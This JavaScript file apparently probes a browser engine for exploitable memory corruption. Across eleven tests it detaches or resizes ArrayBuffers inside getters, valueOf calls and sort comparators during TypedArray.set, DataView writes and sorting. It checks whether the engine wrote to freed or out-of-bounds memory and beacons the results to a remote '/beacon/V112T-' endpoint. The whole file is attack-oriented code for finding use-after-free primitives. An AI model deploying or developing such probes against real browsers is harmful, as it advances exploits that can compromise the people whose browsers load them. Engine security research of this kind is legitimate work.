// p112-internalcb.js — Internal operation callback exploitation
// KEY INSIGHT: TypedArray.prototype.set uses a C++ loop that calls getters
// on the source array-like for EACH element. If the loop doesn't re-check
// IsDetachedBuffer after each Get()/ToNumber() callback, writes go to freed memory.
// p111 P8/P8x tested INDIVIDUAL element access (ta[idx]) — the LLInt re-checks.
// But .set()'s internal C++ loop is a DIFFERENT code path.
//
// Also tests: sort comparator TOCTOU, DataView valueOf detach, clone getter
// Beacon prefix: V112T-

(function(){
var RUN = 'v112t' + Math.random().toString(36).slice(2,14);
var BC = '/beacon/V112T-';

function send(tag, data) {
    var body = JSON.stringify({r: RUN, b: typeof data === 'string' ? data : JSON.stringify(data)});
    try { navigator.sendBeacon(BC + tag, body); } catch(e) {}
}

var hb = setInterval(function(){ send('HB','hb'); }, 5000);

setTimeout(function() {
    send('L', 'press112-internalcb');

    // ═══════════════════════════════════════════════════════════════
    // T1: TypedArray.set + getter source + DETACH on element 0
    // If callCount > 1 after detach → set loop continued → UAF write
    // Clone captures the transferred buffer to detect corruption
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var buf = new ArrayBuffer(256);
            var dest = new Int32Array(buf);
            for (var i = 0; i < 64; i++) dest[i] = 0xAAAA0000 + i;

            var t1_clone = null;
            var t1_callCount = 0;
            var t1_src = {length: 64};

            Object.defineProperty(t1_src, '0', {
                enumerable: true,
                get: function() {
                    t1_callCount++;
                    if (!t1_clone) {
                        t1_clone = structuredClone({x: buf}, {transfer: [buf]});
                    }
                    return 0xDEAD0000;
                }
            });
            for (var i = 1; i < 64; i++) {
                (function(idx) {
                    Object.defineProperty(t1_src, String(idx), {
                        enumerable: true,
                        get: function() { t1_callCount++; return 0xDEAD0000 + idx; }
                    });
                })(i);
            }

            var t1_err = null;
            try { dest.set(t1_src, 0); } catch(e) { t1_err = e.constructor.name; }

            var r = {
                callCount: t1_callCount,
                err: t1_err,
                bufDetached: (buf.byteLength === 0),
                SURVIVED: true
            };

            if (t1_clone && t1_clone.x) {
                var cv = new Int32Array(t1_clone.x);
                r.cloneLen = cv.length;
                var origMatch = 0, deadMatch = 0;
                for (var i = 0; i < Math.min(64, cv.length); i++) {
                    if ((cv[i] >>> 0) === (0xAAAA0000 + i) >>> 0) origMatch++;
                    else if ((cv[i] >>> 0) === (0xDEAD0000 + i) >>> 0) deadMatch++;
                }
                r.origMatch = origMatch;
                r.deadMatch = deadMatch;
                r.UAF_WRITE = (deadMatch > 0);
                r.c0 = '0x' + (cv[0] >>> 0).toString(16);
                r.c1 = '0x' + (cv[1] >>> 0).toString(16);
                r.c63 = '0x' + (cv[63] >>> 0).toString(16);
            }

            send('T1-SET-DETACH0', r);
        } catch(e) {
            send('T1-SET-DETACH0', {err: e.constructor.name + ':' + e.message.slice(0, 80), SURVIVED: false});
        }
    }, 100);

    // ═══════════════════════════════════════════════════════════════
    // T2: TypedArray.set + getter source + DETACH on element 32
    // Elements 0-31 are legitimate writes (before detach)
    // Elements 32-63 would be UAF writes (after detach)
    // Clone detection: clone[32+] should be 0xAAAA if safe, 0xDEAD if UAF
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var buf = new ArrayBuffer(256);
            var dest = new Int32Array(buf);
            for (var i = 0; i < 64; i++) dest[i] = 0xAAAA0000 + i;

            var t2_clone = null;
            var t2_callCount = 0;
            var t2_src = {length: 64};

            for (var i = 0; i < 64; i++) {
                (function(idx) {
                    Object.defineProperty(t2_src, String(idx), {
                        enumerable: true,
                        get: function() {
                            t2_callCount++;
                            if (idx === 32 && !t2_clone) {
                                t2_clone = structuredClone({x: buf}, {transfer: [buf]});
                            }
                            return 0xDEAD0000 + idx;
                        }
                    });
                })(i);
            }

            var t2_err = null;
            try { dest.set(t2_src, 0); } catch(e) { t2_err = e.constructor.name; }

            var r = {
                callCount: t2_callCount,
                err: t2_err,
                bufDetached: (buf.byteLength === 0),
                SURVIVED: true
            };

            if (t2_clone && t2_clone.x) {
                var cv = new Int32Array(t2_clone.x);
                r.cloneLen = cv.length;
                var preDetachDead = 0, postDetachOrig = 0, postDetachDead = 0;
                for (var i = 0; i < 32; i++) {
                    if ((cv[i] >>> 0) === (0xDEAD0000 + i) >>> 0) preDetachDead++;
                }
                for (var i = 32; i < 64; i++) {
                    if ((cv[i] >>> 0) === (0xAAAA0000 + i) >>> 0) postDetachOrig++;
                    else if ((cv[i] >>> 0) === (0xDEAD0000 + i) >>> 0) postDetachDead++;
                }
                r.preDetachDead = preDetachDead;
                r.postDetachOrig = postDetachOrig;
                r.postDetachDead = postDetachDead;
                r.UAF_WRITE = (postDetachDead > 0);
                r.c31 = '0x' + (cv[31] >>> 0).toString(16);
                r.c32 = '0x' + (cv[32] >>> 0).toString(16);
                r.c63 = '0x' + (cv[63] >>> 0).toString(16);
            }

            send('T2-SET-DETACH32', r);
        } catch(e) {
            send('T2-SET-DETACH32', {err: e.constructor.name + ':' + e.message.slice(0, 80), SURVIVED: false});
        }
    }, 500);

    // ═══════════════════════════════════════════════════════════════
    // T3: TypedArray.set + valueOf source elements + DETACH
    // Different callback point: ToNumber(element) fires valueOf,
    // not Get(source, k). Tests if re-check happens after ToNumber.
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var buf = new ArrayBuffer(256);
            var dest = new Int32Array(buf);
            for (var i = 0; i < 64; i++) dest[i] = 0xBBBB0000 + i;

            var t3_clone = null;
            var t3_callCount = 0;
            var t3_src = [];
            for (var i = 0; i < 64; i++) {
                (function(idx) {
                    t3_src.push({
                        valueOf: function() {
                            t3_callCount++;
                            if (idx === 0 && !t3_clone) {
                                t3_clone = structuredClone({x: buf}, {transfer: [buf]});
                            }
                            return 0xCCCC0000 + idx;
                        }
                    });
                })(i);
            }

            var t3_err = null;
            try { dest.set(t3_src, 0); } catch(e) { t3_err = e.constructor.name; }

            var r = {
                callCount: t3_callCount,
                err: t3_err,
                bufDetached: (buf.byteLength === 0),
                SURVIVED: true
            };

            if (t3_clone && t3_clone.x) {
                var cv = new Int32Array(t3_clone.x);
                r.cloneLen = cv.length;
                var origMatch = 0, deadMatch = 0;
                for (var i = 0; i < Math.min(64, cv.length); i++) {
                    if ((cv[i] >>> 0) === (0xBBBB0000 + i) >>> 0) origMatch++;
                    else if ((cv[i] >>> 0) === (0xCCCC0000 + i) >>> 0) deadMatch++;
                }
                r.origMatch = origMatch;
                r.deadMatch = deadMatch;
                r.UAF_WRITE = (deadMatch > 0);
                r.c0 = '0x' + (cv[0] >>> 0).toString(16);
                r.c1 = '0x' + (cv[1] >>> 0).toString(16);
            }

            send('T3-SET-VALUEOF', r);
        } catch(e) {
            send('T3-SET-VALUEOF', {err: e.constructor.name + ':' + e.message.slice(0, 80), SURVIVED: false});
        }
    }, 900);

    // ═══════════════════════════════════════════════════════════════
    // T4: TypedArray.set + getter + RAB RESIZE (not detach)
    // OOB write within reserved maxByteLength range
    // Detection: count getter calls (if all 64 fire after resize to 4 elements)
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var rab = new ArrayBuffer(256, {maxByteLength: 256});
            var dest = new Int32Array(rab);
            for (var i = 0; i < 64; i++) dest[i] = (i + 1) * 111;

            var t4_callCount = 0;
            var t4_src = {length: 64};
            Object.defineProperty(t4_src, '0', {
                enumerable: true,
                get: function() {
                    t4_callCount++;
                    rab.resize(16);
                    return 0x41410000;
                }
            });
            for (var i = 1; i < 64; i++) {
                (function(idx) {
                    Object.defineProperty(t4_src, String(idx), {
                        enumerable: true,
                        get: function() { t4_callCount++; return 0x41410000 + idx; }
                    });
                })(i);
            }

            var t4_err = null;
            try { dest.set(t4_src, 0); } catch(e) { t4_err = e.constructor.name; }

            var t4_rabLen = rab.byteLength;
            var t4_oobCount = 0;
            try {
                rab.resize(256);
                var check = new Int32Array(rab);
                for (var i = 4; i < 64; i++) {
                    if (check[i] !== 0) t4_oobCount++;
                }
            } catch(e2) {}

            send('T4-SET-RESIZE', {
                callCount: t4_callCount,
                err: t4_err,
                rabLenAfterSet: t4_rabLen,
                oobCount: t4_oobCount,
                OOB_WRITE: (t4_oobCount > 0),
                SURVIVED: true
            });
        } catch(e) {
            send('T4-SET-RESIZE', {err: e.constructor.name, SURVIVED: false});
        }
    }, 1300);

    // ═══════════════════════════════════════════════════════════════
    // T5: TypedArray.set + large offset + RAB resize
    // offset=60, src.length=4, total=64 (passes pre-check)
    // After resize to 16 bytes (4 elements), write at offset 60 is OOB
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var rab = new ArrayBuffer(256, {maxByteLength: 256});
            var dest = new Int32Array(rab);
            for (var i = 0; i < 64; i++) dest[i] = (i + 1) * 111;

            var t5_callCount = 0;
            var t5_src = {length: 4};
            Object.defineProperty(t5_src, '0', {
                enumerable: true,
                get: function() {
                    t5_callCount++;
                    rab.resize(16);
                    return 0xEEEE0000;
                }
            });
            for (var i = 1; i < 4; i++) {
                (function(idx) {
                    Object.defineProperty(t5_src, String(idx), {
                        enumerable: true,
                        get: function() { t5_callCount++; return 0xEEEE0000 + idx; }
                    });
                })(i);
            }

            var t5_err = null;
            try { dest.set(t5_src, 60); } catch(e) { t5_err = e.constructor.name; }

            var t5_oobCount = 0;
            try {
                rab.resize(256);
                var check = new Int32Array(rab);
                for (var i = 60; i < 64; i++) {
                    if (check[i] !== 0) t5_oobCount++;
                }
            } catch(e2) {}

            send('T5-SET-OFFSET', {
                callCount: t5_callCount,
                err: t5_err,
                oobCount: t5_oobCount,
                OOB_WRITE: (t5_oobCount > 0),
                SURVIVED: true
            });
        } catch(e) {
            send('T5-SET-OFFSET', {err: e.constructor.name, SURVIVED: false});
        }
    }, 1700);

    // ═══════════════════════════════════════════════════════════════
    // T6: TypedArray.sort + comparator + RAB resize
    // Sort holds internal array/pointers. Resize during comparator
    // may leave sort writing to stale buffer region.
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var rab = new ArrayBuffer(64, {maxByteLength: 64});
            var ta = new Int32Array(rab);
            for (var i = 0; i < 16; i++) ta[i] = (16 - i) * 100;

            var t6_compCount = 0;
            var t6_resized = false;
            var t6_err = null;
            try {
                ta.sort(function(a, b) {
                    t6_compCount++;
                    if (t6_compCount === 3 && !t6_resized) {
                        t6_resized = true;
                        rab.resize(8);
                    }
                    return a - b;
                });
            } catch(e) { t6_err = e.constructor.name; }

            send('T6-SORT-RESIZE', {
                compCount: t6_compCount,
                resized: t6_resized,
                err: t6_err,
                rabLen: rab.byteLength,
                taLen: ta.length,
                SURVIVED: true
            });
        } catch(e) {
            send('T6-SORT-RESIZE', {err: e.constructor.name, SURVIVED: false});
        }
    }, 2100);

    // ═══════════════════════════════════════════════════════════════
    // T7: DataView.setInt32 + valueOf + DETACH
    // DataView write path may differ from TypedArray write path.
    // valueOf during ToNumber detaches the buffer.
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var buf = new ArrayBuffer(256);
            var dv = new DataView(buf);
            for (var i = 0; i < 64; i++) dv.setInt32(i * 4, 0xBBBB0000 + i, true);

            var t7_clone = null;
            var t7_valOfCount = 0;
            var evil = {
                valueOf: function() {
                    t7_valOfCount++;
                    if (!t7_clone) {
                        t7_clone = structuredClone({x: buf}, {transfer: [buf]});
                    }
                    return 0x12345678;
                }
            };

            var t7_err = null;
            try { dv.setInt32(0, evil, true); } catch(e) { t7_err = e.constructor.name; }

            var r = {
                valOfCount: t7_valOfCount,
                err: t7_err,
                bufDetached: (buf.byteLength === 0),
                SURVIVED: true
            };

            if (t7_clone && t7_clone.x) {
                var cv = new Int32Array(t7_clone.x);
                r.c0 = '0x' + (cv[0] >>> 0).toString(16);
                r.c0_orig = '0x' + (0xBBBB0000 >>> 0).toString(16);
                r.UAF_WRITE = ((cv[0] >>> 0) === 0x12345678);
            }

            send('T7-DV-DETACH', r);
        } catch(e) {
            send('T7-DV-DETACH', {err: e.constructor.name, SURVIVED: false});
        }
    }, 2500);

    // ═══════════════════════════════════════════════════════════════
    // T8: structuredClone with getter that returns different types
    // Tests if serializer reads a property multiple times
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var t8_readCount = 0;
            var t8_obj = {};
            Object.defineProperty(t8_obj, 'a', {
                enumerable: true,
                get: function() {
                    t8_readCount++;
                    if (t8_readCount === 1) return new ArrayBuffer(32);
                    return {x: 1, y: 2};
                }
            });
            t8_obj.b = "normal";
            t8_obj.c = 42;

            var t8_err = null;
            var t8_resultType = null;
            try {
                var result = structuredClone(t8_obj);
                t8_resultType = result.a instanceof ArrayBuffer ? 'AB' :
                               (result.a && typeof result.a === 'object') ? 'object' :
                               typeof result.a;
            } catch(e) { t8_err = e.constructor.name; }

            send('T8-CLONE-GETTER', {
                readCount: t8_readCount,
                err: t8_err,
                resultType: t8_resultType,
                DOUBLE_READ: (t8_readCount > 1),
                SURVIVED: true
            });
        } catch(e) {
            send('T8-CLONE-GETTER', {err: e.constructor.name, SURVIVED: false});
        }
    }, 2900);

    // ═══════════════════════════════════════════════════════════════
    // T9: Array.sort + mutating comparator (classic engine bug class)
    // Shrink array during sort, then push new elements
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var arr = [];
            for (var i = 0; i < 200; i++) arr.push({v: 200 - i, idx: i});

            var t9_compCount = 0;
            var t9_mutated = false;
            var t9_err = null;
            try {
                arr.sort(function(a, b) {
                    t9_compCount++;
                    if (t9_compCount === 10 && !t9_mutated) {
                        t9_mutated = true;
                        arr.length = 5;
                        for (var j = 5; j < 200; j++) arr.push({v: j * 3, idx: j + 1000});
                    }
                    return ((a && a.v) || 0) - ((b && b.v) || 0);
                });
            } catch(e) { t9_err = e.constructor.name; }

            send('T9-ARRAYSORT', {
                compCount: t9_compCount,
                mutated: t9_mutated,
                err: t9_err,
                finalLen: arr.length,
                SURVIVED: true
            });
        } catch(e) {
            send('T9-ARRAYSORT', {err: e.constructor.name, SURVIVED: false});
        }
    }, 3300);

    // ═══════════════════════════════════════════════════════════════
    // T10: BigInt64Array.set + getter + DETACH
    // BigInt typed arrays have different element conversion (ToBigInt)
    // Different C++ code path than regular typed arrays
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var buf = new ArrayBuffer(256);
            var dest = new BigInt64Array(buf);
            for (var i = 0; i < 32; i++) dest[i] = BigInt(0xAAAA0000 + i);

            var t10_clone = null;
            var t10_callCount = 0;
            var t10_src = {length: 32};
            for (var i = 0; i < 32; i++) {
                (function(idx) {
                    Object.defineProperty(t10_src, String(idx), {
                        enumerable: true,
                        get: function() {
                            t10_callCount++;
                            if (idx === 0 && !t10_clone) {
                                t10_clone = structuredClone({x: buf}, {transfer: [buf]});
                            }
                            return BigInt(0xDEAD0000 + idx);
                        }
                    });
                })(i);
            }

            var t10_err = null;
            try { dest.set(t10_src, 0); } catch(e) { t10_err = e.constructor.name; }

            var r = {
                callCount: t10_callCount,
                err: t10_err,
                bufDetached: (buf.byteLength === 0),
                SURVIVED: true
            };

            if (t10_clone && t10_clone.x) {
                var cv = new BigInt64Array(t10_clone.x);
                r.cloneLen = cv.length;
                var origMatch = 0, deadMatch = 0;
                for (var i = 0; i < Math.min(32, cv.length); i++) {
                    if (cv[i] === BigInt(0xAAAA0000 + i)) origMatch++;
                    else if (cv[i] === BigInt(0xDEAD0000 + i)) deadMatch++;
                }
                r.origMatch = origMatch;
                r.deadMatch = deadMatch;
                r.UAF_WRITE = (deadMatch > 0);
            }

            send('T10-BIGINT-DETACH', r);
        } catch(e) {
            send('T10-BIGINT-DETACH', {err: e.constructor.name + ':' + e.message.slice(0, 60), SURVIVED: false});
        }
    }, 3700);

    // ═══════════════════════════════════════════════════════════════
    // T11: TypedArray.set from another TypedArray where source buffer
    // gets detached during the copy via a Proxy on the source's buffer
    // Actually: use getter on source that detaches DESTINATION buffer
    // This tests cross-buffer set with destination detach
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var destBuf = new ArrayBuffer(256);
            var dest = new Int32Array(destBuf);
            for (var i = 0; i < 64; i++) dest[i] = 0xFFFF0000 + i;

            var srcBuf = new ArrayBuffer(256);
            var srcTA = new Int32Array(srcBuf);
            for (var i = 0; i < 64; i++) srcTA[i] = 0xABCD0000 + i;

            // TypedArray-to-TypedArray set is fast path (no callbacks)
            // So we test: detach destBuf via a microtask?
            // No — microtasks don't fire during sync operations.
            // Instead: use array-like wrapper around srcTA values
            var t11_clone = null;
            var t11_callCount = 0;
            var t11_src = {length: 64};
            for (var i = 0; i < 64; i++) {
                (function(idx) {
                    Object.defineProperty(t11_src, String(idx), {
                        enumerable: true,
                        get: function() {
                            t11_callCount++;
                            if (idx === 16 && !t11_clone) {
                                t11_clone = structuredClone({x: destBuf}, {transfer: [destBuf]});
                            }
                            return 0xFACE0000 + idx;
                        }
                    });
                })(i);
            }

            var t11_err = null;
            try { dest.set(t11_src, 0); } catch(e) { t11_err = e.constructor.name; }

            var r = {
                callCount: t11_callCount,
                err: t11_err,
                bufDetached: (destBuf.byteLength === 0),
                SURVIVED: true
            };

            if (t11_clone && t11_clone.x) {
                var cv = new Int32Array(t11_clone.x);
                r.cloneLen = cv.length;
                var postDetachOrig = 0, postDetachFace = 0;
                for (var i = 16; i < 64; i++) {
                    if ((cv[i] >>> 0) === (0xFFFF0000 + i) >>> 0) postDetachOrig++;
                    else if ((cv[i] >>> 0) === (0xFACE0000 + i) >>> 0) postDetachFace++;
                }
                r.postDetachOrig = postDetachOrig;
                r.postDetachFace = postDetachFace;
                r.UAF_WRITE = (postDetachFace > 0);
                r.c15 = '0x' + (cv[15] >>> 0).toString(16);
                r.c16 = '0x' + (cv[16] >>> 0).toString(16);
                r.c63 = '0x' + (cv[63] >>> 0).toString(16);
            }

            send('T11-SET-DETACH16', r);
        } catch(e) {
            send('T11-SET-DETACH16', {err: e.constructor.name, SURVIVED: false});
        }
    }, 4100);

    // Done
    setTimeout(function() {
        clearInterval(hb);
        send('Z2', 'probe112-done');
    }, 5000);

}, 500);

})();
